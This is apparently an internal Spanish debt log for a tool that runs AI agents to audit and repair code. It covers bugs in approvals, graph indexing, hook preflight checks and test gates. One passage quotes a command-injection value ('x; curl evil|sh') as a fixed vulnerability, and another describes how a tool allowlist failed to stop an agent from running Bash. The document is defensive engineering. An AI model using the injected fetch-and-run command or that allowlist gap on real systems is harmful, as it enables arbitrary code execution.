# Deudas medidas

**Fecha:** 2026-09-21 · **Commit de referencia:** `cd6a510`

Lo que se sabe que falta, con evidencia. **Nada entra aquí por intuición**: cada
entrada lleva `fichero:línea`, una fila de la base, o la corrida que lo destapó.

> **Regla de este documento.** El tablero de la app acumula hallazgos vivos de
> TODOS los escaneos; la fila de `scans` dice cuántos vio ESE escaneo. Leer la
> pantalla y atribuirle el número a una fecha concreta mezcla semanas de trabajo.
> **La base es la verdad; la pantalla es una vista.** Ninguna cifra de aquí se
> escribió sin comprobarla primero.

---

## 1. Los cinco defectos del ensayo autónomo (2026-09-19)

Medidos tras el primer lote que el autónomo resolvió solo (3 de 3 procesados, 2
cerrados a Historia). **El orden de arreglo fue 1 → 5 y era innegociable**: el 1
es un agujero de garantía, el 2 la raíz de varios síntomas, y los demás dependen
de entenderlos.

> **Estado: 1-4 CERRADOS y construidos con gate 5/5. El 5 sigue ABIERTO** — y no
> por pereza: su causa **no está en el código medible**, está en un evento que
> hay que volver a provocar. Arreglarlo desde la base sería construir contra un
> fantasma.

### ~~(1) La aprobación de OMEGA no caduca~~ — **CERRADO** `1256620`

`olvidarAprobacion` (`src/infrastructure/aprobacion-del-plan.ts:32`) tiene **cero
llamadores de producción**. Su propio docblock promete _«El lote termino, o la
seleccion cambio: lo aprobado deja de estarlo»_, y nadie la llama.

**Consecuencia:** los ids aprobados seguían aprobados mientras viviera el
proceso. Un segundo lote con los mismos hallazgos **cruzaba la puerta del
ADR-097 §4 sin que OMEGA juzgara nada**. Fue primero por ser lo único de la
lista que debilitaba una garantía escrita.

**Arreglo:** caduca por dos vías, las dos solo-main. **(a)** un plan nuevo
invalida el permiso viejo antes de juzgarlo; **(b)** el permiso se **gasta** al
usarse, después de las dos puertas. Y el docblock de `olvidarAprobacion` dejó de
prometer una garantía por una vía imposible —los tres momentos que nombraba
viven en el renderer y esa función vive en el main, sin canal que los una—.

### ~~(2) El agente cree estar en supervisado~~ — **CERRADO** `3ff4186`

El turno de plan del lote manda `mode: 'supervisado'` a propósito, para que no
edite. Pero ese modo viaja hasta el prompt:

`lote-por-enter.ts` → `modo-del-turno.ts:28` → `send-message.ts:47,60` →
`reply-from-chat.ts:45` → **`chat-prompt.ts:33`** → `MODE_INSTRUCTION[mode]`

El agente recibe _«MODO SUPERVISADO: propon los cambios y espera aprobacion»_ y
obedece. Evidencia en la base, fila `chat_messages` de `2026-09-19T08:59:56Z`
(`mode='supervisado'`), texto literal del agente:

- _«…para aprobación directa (que es lo que pide el modo supervisado)»_
- _«Bloqueado por el modo supervisado (2):»_
- _«## Necesito cuatro decisiones tuyas»_

**Y un tercer síntoma, el más caro:** el mismo modo da
`permissionModeFor('supervisado') = 'plan'` (`permission-mode.ts:26`), y
`permission-mode.ts:4-8` ya documenta que **`plan` bloquea todas las llamadas
MCP**. El agente lo dijo: _«Grafo bloqueado en plan mode — sigo a mano»_. El turno
más caro del lote —**563 s, $5,02**— planeó sin grafo. El repo ya tiene la
solución (`'lectura'`, usada en `run-investigate.ts:21`); este camino no la usaba.

**Arreglo:** se anularon **solo las dos salidas malas** del `mode`. El turno de
plan corre en `'lectura'` —el grafo responde y el allowlist sigue sin `Write`,
`Edit` ni `Bash`— y recibe `INSTRUCCION_DEL_PLAN`, que no manda esperar a nadie.
El pie dejó de decir «supervisado» en un proyecto autónomo. **`mode:
'supervisado'` se quedó intacto**: es el portador legítimo de «no edita / no se
juzga», y tocarlo habría abierto un checkpoint vacío por turno de plan.

### ~~(3) La barra verde fija en autónomo~~ — **CERRADO** `2c9f168`

`pie-del-lote.ts:36` devuelve `'ejecutando'` **antes** de mirar el modo, así que
la píldora verde `Plan ejecutandose…` (`BotonDelPlan.tsx:8-11`, `bg-success`) sale
también en autónomo y dura todo el lote, porque cuelga de `enCurso` y no de la
fase. Las fases (Debate naranja / OMEGA azul) viven en otro componente,
`RunMeter.tsx`, y por eso aparecían en otro sitio de la pantalla.

**Arreglo:** en autónomo el pie es texto plano —`Lote 2 de 3 · Consultando a
OMEGA`—, con el lote como **ancla persistente** y la fase como **sufijo
opcional**: el medidor se apaga en el `finally` de cada envío, así que enseñar
solo la fase dejaría el pie en blanco entre turnos. El color va solo en el
sufijo. La barra de estado global no se tocó; supervisado tampoco.

### ~~(4) El grafo no se re-indexa tras editar~~ — **CERRADO** `2622946`

> **⚠ LA CAUSA QUE ESTE DOCUMENTO DABA ERA FALSA, y el arreglo que sugería
> habría CAUSADO el bug.** Decía: _«el lote edita y comitea, así que el sha se
> mueve»_, y proponía re-indexar tras cada turno. **El lote NO comitea**: el
> checkpoint es transitorio y `reset --soft` lo deshace
> (`checkpoint-transitorio.ts:38-45`). Re-indexar «tras editar» habría indexado
> justo el commit efímero — que es el bug.

**La causa real, medida el 2026-09-19:** el grafo se indexó **sobre un commit de
checkpoint** que luego se deshizo. `raisen-nucleo` quedó con
`indexado = 1752916` —un commit titulado literalmente «checkpoint transitorio»—
mientras HEAD seguía en `7e7eb7b`, del operador, del 1 de agosto. El índice no
se quedó atrás: **apuntaba a un sha borrado**, y por eso `currentSha !==
indexedSha` para siempre.

**Arreglo, dos piezas.** **(b)** `decideReindex` no indexa con un turno vivo —la
señal se **deriva** del carril (`turnoVivo: isRunning`), que ya tiene su
`endRun` en cada `finally`, en vez de inventar un registro que habría que soltar
a mano—. **(a)** el lote reconcilia **al cerrar**, con el árbol ya quieto.

Y quedó fijado por test que un índice apuntando a un sha inexistente **se
repara**: `decideReindex` compara igualdad, no ascendencia.

### (5) Dos fallos sin causa en el código — **ABIERTO, esperando reproducción**

**No es arreglable desde la base**, y por eso no se fuerza: su causa está en un
evento que hay que volver a provocar, no en una línea que se pueda leer.
Construir sobre lo que no se ha visto es exactamente lo que ADR-097 evitó al
borrar el «¿y si OMEGA se cae?» que nadie había medido.

#### PARTE A — el hallazgo 2 se saltó el debate. **Es un BUG, no diseño**

Hallazgo `3c160747` (migración SQL, MEDIUM). **Su ventana entera fue el
productor solo**, y se probó por aritmética, no por ausencia de filas:

|        | ventana   | corridas                               | suma      |
| ------ | --------- | -------------------------------------- | --------- |
| H1     | 848 s     | productor 367 + crítico 414 + OMEGA 63 | 844 s     |
| **H2** | **473 s** | **productor 471**                      | **471 s** |
| H3     | 676 s     | productor 273 + crítico 323 + OMEGA 79 | 675 s     |

**NO lo cortó el gate.** Los **tres** turnos llevan `CONSERVADO_SIN_VERIFICAR`,
que solo se emite con `arbol === 'desconocida'` (`turno-protegido.ts:42`). Y
`desconocida` **no corta** (`verificacion-del-arbol.ts:31`) y **sí permite
tribunal** (`tribunal-del-turno.ts:32`). H1 y H3 debatieron bajo el mismo estado.

**Mismas condiciones, comportamiento distinto: bug.**

**Lo que NO se pudo cerrar.** De las tres salidas de `arbitrar:60`
(`rojo || !edito || juez === null`): `rojo` descartado —el aviso lo prueba—,
`edito` descartado —`edits=3`—. **Queda `juez === null` sin explicar**, y la base
no muestra qué guarda disparó. **No se inventa: necesita reproducción con logs.**

#### PARTE B — una corrida murió sin dejar NADA

Ventana `09:42:49Z → 10:25Z`: **0 `agent_runs`, 0 `chat_messages`**. El Motor
escribió a las 10:25, así que la base estaba viva: **el silencio es de esa
corrida**.

Y el dato que decide el arreglo: **no dejó ni el mensaje de usuario**, que
`send-message.ts:54` persiste **antes** del turno. Murió antes de llegar ahí, o
murió el proceso principal entero.

> **Por eso el vocabulario tipado del Motor NO cubre este caso.** El `noArranco`
> del Motor deja fila porque el proceso **llega a registrar**. Aquí nada llegó a
> escribirse, y **no se puede tipar un fallo que ocurre antes del punto donde se
> escribe**. Son fallos distintos, y el de aquí necesita instrumentación que hoy
> no existe.

#### PLAN — una sola reproducción sirve para las dos

Una corrida del lote con la app abierta, mirando **los logs de consola además de
la base**. Si H2 vuelve a saltarse el debate, los logs dirán qué guarda saltó
(A). Si algo se cae, veremos si deja fila y dónde muere (B).

---

## 2. El contador del escaneo miente

`scans.finding_count = 27` para el escaneo `e7212154` (2026-09-18), contra **23
filas reales** en `findings` con ese `scan_id`. Desfase de 4, a favor del
contador. Lo destapó la auditoría de este documento.

Importa más de lo que parece: ese contador es lo que se lee para decir cuánto
encontró un escaneo, y es la cifra que acaba en un parte o en un informe.

---

## 3. El debate ve el grafo PRE-LOTE

Salió al medir el bug 4, y **no se arregló a propósito**: cambia el contrato del
indexador y merece su propio arco con ADR.

El lote **no comitea** —el checkpoint es transitorio—, y el índice del grafo es
**de commits**. Así que el crítico del turno N navega el código **anterior al fix
del turno N-1**, siempre, y ninguna re-indexación lo arregla: esas ediciones no
están en ningún commit que indexar.

**Cuándo muerde:** dos hallazgos del mismo módulo que se pisan entre turnos. En
el ensayo dio igual —tres ficheros sin relación—.

**Cubierto parcialmente:** el gate del turno N y su propio `cp.diff()` cazan un
fix malo aunque el mapa esté viejo. Lo que se pierde es **contexto**, no la red.

**Lo que haría falta:** indexar el árbol de trabajo en vez del HEAD. Es otro
modelo del grafo — su propio arco, no este bug.

---

## 4. La premisa falsa de `--allowedTools` — ¿qué más se apoya en ella?

Medido el 2026-09-20, dos corridas, $0.60:

|                                              |                                                                                            |
| -------------------------------------------- | ------------------------------------------------------------------------------------------ |
| `--allowedTools Read` + prompt que pide Bash | **Bash se ejecutó**, `permission_denials` **vacío**                                        |
| el mismo, con `--disallowedTools Bash`       | **«NO_PUDE_BASH»**, y `permission_denials` **también vacío** — la herramienta no se ofrece |
| `Write` sin listar                           | **denegado**, con fila en `permission_denials`, y el fichero no existe en disco            |

**`--allowedTools` PRE-APRUEBA. No deniega.** El docblock de
`build-allowed-tools.ts:11-12` afirmaba _«escribir/Bash quedan denegados por no
estar en la lista»_ — **falso en la mitad de Bash**, y lo creyó todo el que lo
leyó. Ya está corregido allí.

**La deuda que queda es la pregunta grande:** ese docblock era la fuente de
verdad sobre qué bloquea el allowlist. **¿Qué otras garantías del repo se apoyan
en esa premisa?** Un sitio que omita una herramienta de `--allowedTools` creyendo
que la bloquea, no la bloquea.

**Sin revisar todavía.** El barrido es `grep` de `allowedTools` y de cada
docblock que diga «denegado», «bloqueado» o «no puede» sobre una herramienta.

> **La lección, y vale más que el arreglo:** el gate estaba verde, el test estaba
> verde, y la garantía era falsa. Solo la corrida lo distingue. Un docblock que
> afirma una garantía de seguridad **sin que nadie la haya falsado** es una
> premisa heredada, y se hereda hacia abajo: lo repitió el código, lo repitió un
> test, y lo repitió quien escribió la pieza de encima.

---

## 5. Conectado el Terminal al registro de observaciones (2026-09-20)

> Es el **(2) del segundo ensayo** —«conectar el Terminal al JSON de
> observaciones»—, no el bug 2 de §1. Aquel era el modo de permisos.

**Primer órgano del sistema nervioso conectado.** El Terminal ya escribía
observaciones derivadas de `permission_denials` (`finish-turn.ts:51`); ahora
escribe también lo que descubre **reparable en el proyecto del cliente**.

Un **pre-vuelo determinista** lee el `.claude/settings.json` del proyecto antes
de correr el turno, saca sus hooks `PreToolUse` y comprueba que el intérprete
existe. Si un hook declarado **no puede arrancar**, eso es una barrera rota: el
proyecto cree estar protegido y no lo está.

| pieza                  | fichero                                          |
| ---------------------- | ------------------------------------------------ |
| lectura del dato       | `domain/project/hook-del-proyecto.ts`            |
| detección              | `domain/project/barrera-rota.ts`                 |
| derivación de la obs   | `domain/project/observacion-de-barrera.ts`       |
| área nueva             | `domain/system/areas-del-terminal.ts`            |
| `command -v` sin shell | `infrastructure/project/interprete-existe.ts`    |
| pre-vuelo              | `infrastructure/project/barreras-del-proyecto.ts`|
| fail-closed            | `infrastructure/barrera-guard.ts`                |

- **`kind: 'bug'`, `area: 'barrera-del-proyecto'`** (vocabulario cerrado, tercera
  familia). Con área propia, dos clientes con la barrera rota suman avistamientos
  juntos y `vistaEn: 2` da la señal; en `otro` se habría fundido con el cajón.
- **Fail-closed en autónomo**: el lote NO corre sin la protección. En supervisado
  no bloquea —hay humano— pero la observación se asienta **igual**.
- **Del DATO, no de `stderr`.** La config del proyecto es estructura versionada
  por un esquema; el aviso del CLI es texto inglés que cambia sin avisar.

### 5.1 Cinco fallos cazados durante la construcción — arreglados, con su lección

Ninguno es deuda abierta. Están aquí porque **la lección vale más que el arreglo**.
Los cinco son patrones que esta sesión ya conocía, reapareciendo en la pieza nueva.

**1. `command -v` con shell era ejecución arbitraria desde la config del cliente.**
El comando sale del `settings.json` de un repo AUDITADO. Con `sh -c "command -v $x"`,
un `"command": "x; curl evil|sh"` se habría ejecutado por el simple hecho de
**abrir el proyecto**. Arreglado recorriendo el `PATH` con `access(X_OK)`, sin
intérprete, más 3 tests de inyección que fallan si alguien devuelve una shell.

> **LECCIÓN: una defensa que verifica dato del cliente no puede ser ella misma
> una vía de ejecución.** El pre-vuelo que detecta barreras rotas no puede ser
> una barrera rota.

**2. Una pared redundante, delatada al romperla.** Tenía
`if (settings === null) return []` en el pre-vuelo. Al romperla **no cayó ningún
test**: el dominio ya devuelve lista vacía ante `null`, basura o un `hooks` que no
es objeto. Era la garantía duplicada encima de donde ya vive. Quitada.

> **LECCIÓN: una comprobación que al romperla no rompe ningún test, no hace nada.**
> Romper paredes no solo confirma las reales — **delata las pintadas**.

**3. Un test de determinismo que pasaba por SUERTE.** Comparaba dos llamadas
seguidas, y `Date.now()` devuelve lo mismo dentro del mismo milisegundo: con la
nota bailando, el test seguía verde. Corregido para **cruzar el milisegundo**, más
un segundo test que cuenta **filas** de `observation_sightings` —`vistaEn` no se
movía porque cuenta proyectos, no avistamientos—.

> **LECCIÓN: un test que pasa por coincidencia temporal da falsa confianza, y eso
> es peor que fallar.** Mismo patrón que el `not.toMatch` que casaba el docblock
> en vez del código.

**4. El fail-closed podía desarmarse a sí mismo.** `innegociables-derivados`
deriva sola la puerta —`guardBarrera` casa con `guard\w+`— pero **no el
pre-vuelo**: `barrerasDelProyecto` no exporta ninguna guarda. Un fix que lo
hiciera devolver lista vacía apagaría el fail-closed **entero sin tocar la
puerta**, y habría entrado por auto-merge sin que nadie lo viera. Blindado con un
test que exige las **dos mitades** en la lista innegociable.

> **LECCIÓN: es `innegociables-derivados` otra vez** —el auto-merge borrando su
> propia puerta—. **Cada mitad de una defensa nueva tiene que estar protegida, no
> solo la visible.**

**5. Un byte NUL real dentro de un `.ts`, que pasó el gate entero.** El escape
`\0` de un test se escribió como **byte**, no como texto. Git marcó el
fichero como binario (`Bin 0 -> 2445 bytes`): habría entrado a `main` **sin diff
legible**. Y el fichero era justo `interprete-existe.test.ts` — el que prueba que
el `command -v` no abre una shell. Arreglado con `String.fromCharCode(0)`, que
deja el fuente en ASCII puro y prueba exactamente lo mismo.

**Lo delató `git diff --stat`, no el gate.** Typecheck, lint y los 3804 tests
pasaron con el NUL dentro, porque **el código funcionaba**.

> **LECCIÓN: el gate verifica el comportamiento, no la forma en el repo.** Cinco
> pasos verdes no garantizan que el código sea legible, auditable ni revisable.
> Un test de seguridad crítico habría llegado a `main` como binario opaco: nadie
> —ni el próximo agente, ni una revisión humana— podría leer qué prueba, y un
> fallo dentro pasaría desapercibido **para siempre**, porque el diff no se puede
> leer. Es la pared pintada llevada al extremo: no una garantía falsa, sino una
> garantía **ilegible**. `git diff --stat` antes de commitear no es un trámite:
> es lo único que caza un fichero que funciona y es opaco.

> ⚠ **DEUDA ABIERTA, y es la única de las cinco sin pared** → **§6.1**. Las otras
> cuatro quedaron defendidas por un test; esta, por ahora, depende de recordar
> mirar. La defensa derivada no se construyó aquí a propósito: va después del
> ensayo.

#### El patrón que une a los cinco

| # | fallo                          | patrón                          |
| - | ------------------------------ | ------------------------------- |
| 1 | `command -v` con shell         | la defensa que abre otro agujero |
| 2 | el `null` duplicado            | la pared redundante             |
| 3 | el test del reloj              | el test que pasa por suerte     |
| 4 | el pre-vuelo sin proteger      | la defensa que se auto-desarma  |
| 5 | el byte NUL                    | el verde ilegible               |

> **VERDE NO BASTA.** El test que pasa por coincidencia del reloj, el
> `not.toMatch` que casaba el docblock, el docblock que mentía sobre seguridad y
> el fichero binario que pasa el gate son **lo mismo**: verde que no significa lo
> que parece. La disciplina no es «que el gate pase»; es **«que el gate pase Y
> que puedas ver por qué»**. El NUL rompe la segunda mitad sin tocar la primera.

### 5.2 Las otras venas del Terminal — arco siguiente, NO abierto

Quedan dos observaciones del backlog esperando la suya, y **no se abrieron a
propósito**:

| obs  | qué dice                | qué le falta                        |
| ---- | ----------------------- | ----------------------------------- |
| [16] | «no puedo instalar»     | un dato estructurado del que salir  |
| [17] | «herramienta fantasma»  | idem — `check_index_coverage` está en `GRAPH_READ_TOOLS` y el servidor no lo expone |

**La regla que este arco dejó escrita, y que decide cómo se abren:**

1. Si tienen **dato estructurado** (un `rc`, un `permission_denial`, una entrada
   de config), se derivan de ahí, como la barrera rota salió del
   `.claude/settings.json`. Eso es barato y no se rompe solo.
2. Si **solo viven en `stderr`**, es otro arco. `run-accumulator.ts:62` tira el
   stderr cuando el turno tiene éxito, y conservarlo habilitaría las dos — pero
   el `stderr` del CLI es **texto inglés sin versionar**: el día que Anthropic
   cambie la frase, la derivación deja de encontrar nada **y no falla, calla**.
   Ese arco tiene que traer su propia decisión de «cómo no romperse en silencio»,
   y sin ella no se abre.

> **Por qué esto es una deuda y no una tarea.** La opción fácil —parsear
> `stderr`— estaba disponible y se descartó midiendo, no por gusto. Escribirlo
> aquí es lo que impide que dentro de un mes alguien la tome por ser la corta.

### 5.3 Lo que el pre-vuelo NO cubre (dicho, no escondido)

- **OBSOLETO el 2026-09-26** (ADR-105, merge `4dbaa1b`): se decidió y se
  construyó. ~~Un turno **suelto** en autónomo también edita, y `guardBarrera`
  lo deja pasar: lo que se decidió bloquear fue el **lote**. Quitar
  `ejecutaUnLote` es una línea y la costura está puesta; no se amplía sin
  decidirlo.~~ Hoy la guarda es `guardBarrera(context, projectId, edita)`: el
  chat pasa `editaElChat` (autónomo en la base y turno por el CLI, sin mirar el
  input, así que suelto, lote y workflow son iguales) y el Ejecutor de Construir
  pasa `true` (negado sea cual sea el modo, recibo en el historial).
  `ejecutaUnLote` ya no participa en la guarda.
- Solo mira `PreToolUse`. Un `PostToolUse` roto pierde un aviso; un `PreToolUse`
  roto deja pasar la escritura que venía a impedir. Esa es la línea, y es la
  correcta mientras lo que se protege sea lo irreversible.

### 5.4 Corrección de un hecho que constaba como aplicado

El arreglo de `raisen-nucleo/.claude/settings.json` —`python`→`python3` en los
dos hooks, los seis `deny` extendidos a `Edit`/`MultiEdit`, backup
`.bak-pre-fix-hooks-2026-09-20`— **figuraba como hecho y verificado. No lo está.**
Medido el 2026-09-20: el fichero sigue con `python`, `command -v python` está
vacío, no existe ningún `.bak` en la máquina y los `deny` siguen cubriendo solo
`Write(...)`. La barrera lleva muerta desde julio.

> Es la misma clase de defecto que §4: **una protección dada por buena sin que
> nadie la comprobara.** Que sea justo lo que este arco vino a detectar no es
> casualidad; es la razón de que exista.

---

### 5.5 Sangrado medido: jueces huérfanos de la suite de integración (2026-08-26 → 2026-09-24)

Destapado el 2026-09-24 al confirmar la huella de la caché del grafo tras
mergear la pieza B del arco #4. El check «Loop blindado» de la suite de
integración enciende un loop real sobre el repo propio (`projects.self()`) y
revoca la confianza unas líneas después. Entre medias el motor ya iba hacia el
escaneo: el juez del alcance (`claude -p "Clasificas el ALCANCE…"`) nacía sobre
el repo, y la parada se perdía por una carrera —`tryBeginRun` borra la marca de
cancelado, o el hijo nace después de que `killChildrenOf` matara a los vivos—.
La app salía sin matar hijos: el juez quedaba huérfano (reparentado a systemd),
70 ms o hasta dos minutos según la carrera, con un `codebase-memory-mcp` colgado
de él vigilando el repo y reindexándolo al ver cambios (14:11:20Z del 24-sep).

**Medido, no estimado**: los logs MCP del CLI con cwd en el repo
(`~/.cache/claude-cli-nodejs/…/mcp-logs-codebase-memory/`) suman **275
conexiones desde el 26 de agosto**; 170 viven entre 60 y 180 s, la forma del
juez (88 a 124 s medidos), en 171 sesiones distintas; 89 viven más de 180 s
(turnos legítimos) y 16 menos de un minuto. Ocho el 24-sep solo. Cada una es un
`claude -p` real sobre el repo, en el plan del operador, sin que nadie lo
pidiera. Las sondas `claude --version` y `claude auth status` quedan
descartadas: no abren MCP (probado desde cwd vacío y desde el repo).

**Cerrado en `main`** (merge `f836f14`, 3 commits, 3 mutantes muertos, gate 6/6
con las tres pruebas): `loopScan` honra la parada ANTES de reservar el carril
(`loopParado`, que pregunta solo «lo pararon»); el agente mata al hijo al
registrarlo si su proyecto ya está cancelado; y `will-quit` pasa por `alSalir`,
que mata a todos los hijos antes de cerrar la base. Lección, la de §4 y §5.4:
un test que enciende algo real tiene que apagarlo, y la app no puede fiarse de
que sus hijos mueran con ella.

---

### 5.6 `has_graph`, la contabilidad del grafo que mentía: medido y cerrado (2026-09-24)

Medido sobre la base viva en solo lectura: `has_graph` estaba en **0 en siete
de ocho proyectos**, seis de ellos con índice en disco y `graph_indexed_at_sha`
puesto, y en **1 en el único sin índice** (mailbd, cuyo `.db` desapareció cuando
la caché entera renació el 2026-08-29 sin que conste quién la borró). La causa no
era el slug ni el store mixto: **dos escritores para una verdad y ningún
lector**. El 1 lo ponía solo `installGraph` (el botón de instalar) por
`setGraph`; el reconcilio por sha, que es como se indexaron los seis, escribía
`graph_indexed_at_sha` por `markSuccess` y nunca tocaba la bandera; y la decisión
comparaba shas sin mirar si el `.db` existía, así que mailbd salió «alineado con
HEAD» en cada arranque durante un mes.

**Cerrado en `main`** (merge `686b212`, 9 mutantes muertos): `decideReindex`
recibe `indiceEnDisco` y un índice ausente se reindexa aunque el sha coincida;
`clearGraph` es el inverso de `setGraph`; el reconcilio alinea la bandera con el
disco antes de decidir y el éxito del runner exige el `.db`. Verificado con el
código real sobre una copia de la viva: seis proyectos 0→1 con sus nodos, mailbd
1→1 (indexado en la máquina con el binario fijado: 1232 nodos), Trade99PRO 0→0
(sin repo git, §6). En la viva cambia al primer arranque con el binario
reconstruido.

---

## 6. Deudas estructurales

| deuda                                 | evidencia                                                                   | qué la desbloquea                                                                                                                                    |
| ------------------------------------- | --------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| ~~**ADR-092 (el sandbox) sin escribir**~~ — **CERRADO** `cd6a510` | firmado `3af7007`, construido en 24 commits y en `main` el 2026-09-21: `npm ci` por el proxy medido en vivo | lo que deja abierto, en §6.2 |
| **Verificación de stacks no-Node**    | el gate corre `npm`; un repo Python o Go no se verifica                     | ADR-092 + Bash libre. **No** un gate por lenguaje: sería mantener N gates                                                                            |
| **`sendMessage` saturado**            | 11 parámetros posicionales (`send-message.ts:23-36`)                        | rozada tres veces sin tocarla; se parte por costura cuando un arco la despierte de verdad                                                            |
| **`build-prompt.ts:6`**               | `'- NUNCA toques auth, pagos, RLS ni seguridad sin dejarlo escrito antes.'` | **medir primero**: dice «sin dejarlo escrito antes», no «vuelve a supervisado». Puede ser transparencia legítima o el freno de ADR-089 con otra ropa |
| **Ningún paso del gate mira la FORMA del fuente** | el NUL de §5.1-5: `interprete-existe.test.ts` pasó typecheck, lint y 3804 tests, y Git lo marcó `Bin 0 -> 2445 bytes` | una defensa derivada (~15 líneas en `src/domain/repair/`) que rechace todo `.ts` de `src/` con bytes de control |
| **El índice de ADRs va por detrás** | `docs/DECISIONS/README.md` no tiene fila para ADR-091 a 098, y el 094 no existe (visto el 2026-09-22 al añadir ADR-099) | añadir las ocho filas. Deuda de documentación, no de este arco (ADR-099 §3, firmado) |
| **El score del escaneo cuenta los descartados** | `expediente-del-cierre.ts:29-31` puntúa `datos.reportados` (sin `status`) más los ACTIVE ausentes (`ausencia.ts:24`, sin mirar `status`); el quality audit sí filtra (`run-quality-audit.ts:24`, `isOpen`) y el push también (`record-push-decision.ts:28`). Medido el 2026-09-23, §6.3 | filtrar los descartados en `calcularExpediente` con el mismo `isOpen`, y un test que descarte un CRITICAL reportado y compruebe que el score del cierre no baja |
| **Patrón repetido en N ficheros sin modelar** | la observación de Trade99PRO del 2026-09-12 (`contrato-del-hallazgo`, pendiente): «ni un hallazgo de patrón repetido en N archivos; hubo que partirlo en entradas sueltas y dejar funciones de menor impacto en prosa». El contrato exige fichero y línea concretos por hallazgo, así que un defecto idéntico en N funciones son N filas o prosa. Medido el 2026-09-23 al medir las cadenas, §6.4 | pieza propia: un hallazgo «de patrón» con sus N sitios, cuando una segunda observación lo pida |
| **Patrón A: la línea que ya no es (deriva de línea)** | 6 de 40 vivas de FORTRESS con el ancla en un comentario de un fichero que cambió tras `first_seen`; 0 en clientes (repos estáticos); 0 duplicados por línea tras el lote del alias. Medido el 2026-09-23, §6.5 | medir la deriva de línea en el próximo escaneo de FORTRESS con `medir:deriva`; si la palanca 1 no la mata, el lote del alias automático tras cada escaneo |
| **El store del grafo lleva 4 tablas de la 0.11.0** | la sesión de Claude Code del operador arrancaba el grafo con `npx -y codebase-memory-mcp` sin versión (`~/.claude.json`) y un daemon 0.11.0 escribió en la caché real `index_coverage`, `index_coverage_meta`, `lsp_surface` y `store_meta` (medido el 2026-09-24); la 0.9.0 fijada las ignora, mismas columnas en `nodes`, `edges`, `file_hashes` y `projects`. El 2026-09-24 la sesión quedó fijada al binario del PATH (0.9.0), el daemon parado y las cachés de npx borradas; huella de los 7 SQLite y del binario idéntica antes y después | inofensivas; si algún día se sube a 0.11.0 (arco futuro), ya están. No borrarlas a mano |
| **Handlers inline sin descomponer en el grafo** | `serve(async (req) => …)` de Deno y `http.createServer((req, res) => …)` dan UN solo nodo: el cuerpo del handler no tiene símbolos (ensayo-fail-closed: 62 nodos y 1 Function; mailbd: 6 observaciones sobre las edge functions). Hueco de GRANULARIDAD, no de cobertura; igual en 0.9.0 y 0.11.0. Medido el 2026-09-24, ADR-104 §4 | medir cuánto pesa (hallazgos vivos en handlers inline y cuántas lecturas cuesta) antes de tocarlo; firmado en ADR-104 casilla 5: no va al prompt |
| Trade99PRO sin índice del grafo | Está en disco (`~/Escritorio/Trade99PRO`, 27 275 ficheros) pero NO es un repositorio git y no es de confianza: el reconcilio salta con «sin repo git» y el botón de instalar exige confianza, así que sus 19 vivas quedan invisibles al grafo (medido 2026-09-24, pieza B del arco #4). | Un `git init` del operador en ese proyecto, o un runner que indexe sin exigir sha (el binario no necesita git). |
| **La columna «dónde se arregla» (ADR-102 §1.5)** | el analista ya declara `arreglo` (fichero y línea) y el guard lo contrasta con la correa; no se persiste como columna propia ni se pinta en la fila: hoy solo vive dentro del JSON del análisis de la propuesta (medido 2026-09-23). | Un consumidor que la lea —la fila del hallazgo o el selector—; hasta entonces es infraestructura por adelantado, como el corte 2 y el defecto a propósito (§6.3). |

### 6.1 La defensa que falta: ficheros fuente opacos

**Medido el 2026-09-20.** Un fuente con un byte de control —un NUL— **pasa los
cinco pasos del gate** y llega a `main` como binario, **sin diff legible**. El
gate verifica que el código funciona; **no verifica cómo se ve en el repo**.

Lo cazó `git diff --stat`, no el gate.

> **LECCIÓN: `git diff --stat` antes de commitear es parte de la disciplina**, no
> un trámite. Es lo único que caza un fichero que funciona y es opaco.

**Por qué es deuda y no está cerrada:** las otras cuatro lecciones de §5.1 tienen
**pared** —tests de inyección, el break que delató la redundancia, el cruce del
milisegundo, el test de las dos mitades—. **Esta depende de que alguien se acuerde
de mirar**, que es exactamente lo que `innegociables-derivados` existe para no
tolerar: *«un fichero nuevo… falla aquí, sin que nadie se acuerde de mirar»*.

**Forma que tendría** (no construida — va después del ensayo):

```ts
const opacos = ficheros('src').filter((f) => /[\x00-\x08\x0B\x0C\x0E-\x1F]/.test(fuente(f)))
expect(opacos).toEqual([])
```

Vive junto a sus hermanas en `src/domain/repair/`, reusando el barrido de
`innegociables-derivados`. Coste: ~15 líneas y un rerun del gate.

### 6.2 Lo que el sandbox deja abierto (2026-09-21)

Tres deudas menores, **medidas al cerrar el arco** (`cd6a510`), ninguna bloquea:

| deuda | evidencia | qué la cierra |
| --- | --- | --- |
| **`runCommand` corre en la caja SIN red** | `probe/run-command.ts` y `build-verify.ts` van por `enCaja` sin socket: hoy ninguna sonda instala nada | el día que una sonda necesite el registro, darle el proxy como al gate (`spawn-command.ts`) |
| **La sonda de bwrap se recuerda por proceso** | `cajaDisponible` (`sonda-de-bwrap.ts`) memoriza por PATH y no caduca: instalar bwrap con la app abierta no se ve hasta reiniciar | caducar la memoria, o invalidarla desde la pantalla de diagnóstico |
| **Sin caché por proyecto** | cada `npm ci` descarga por el proxy (medido: 1-3 s en un proyecto pequeño); la caché compartida está firmada como NO (canal lateral) | si un proyecto grande lo hace lento, una caché dentro de SU propia caja, nunca compartida; medirlo antes |

### 6.3 Defecto a propósito: medido, anotado, no construido (2026-09-23)

**Decisión de Jojo y el CTO sobre la medición del 2026-09-23** (main `9a599b7`,
base viva en solo lectura): **no se construye**. Es infraestructura por adelantado,
como la relación «mismo defecto» del corte 2 y la columna «dónde se arregla» de
ADR-102 §1.5.

**Lo medido:**

- **No hay estado «intencional».** `status` es `open` o `false_positive`
  (`finding-status.ts`), una decisión del operador guardada en `dismissals` por
  fingerprint y sin motivo; `lifecycle` es ACTIVE, MITIGATED o EXTINCT. Hoy
  «no es defecto» y «es defecto a propósito» caen en la misma casilla.
- **El backlog decía 7 observaciones; son 5**, todas de agosto y en 2 proyectos, y
  **ninguna es un defecto plantado**: son **riesgos aceptados por escrito** (el
  CSP con `unsafe-inline` documentado en FORTRESS, 4 filas nacidas entre el 9 y
  el 23 de agosto y hoy todas EXTINCT, 2 por `juicio_obsoleto`; y en mailbd «lo
  aceptado a propósito vive en `SECURITY-FIXES.md` y en las cabeceras de las
  migraciones, no en el README plantilla»).
- **En clientes, cero daño.** Las 17 vivas en carpetas de tests o docs (Health
  Flow 14, Omega 2, FORTRESS 1) son defectos **reales**: contraseñas en docs y en
  tests e2e, políticas RLS abiertas en SQL de docs, documentación que contradice
  el código. Ningún título vivo dice «a propósito» ni «intencional».
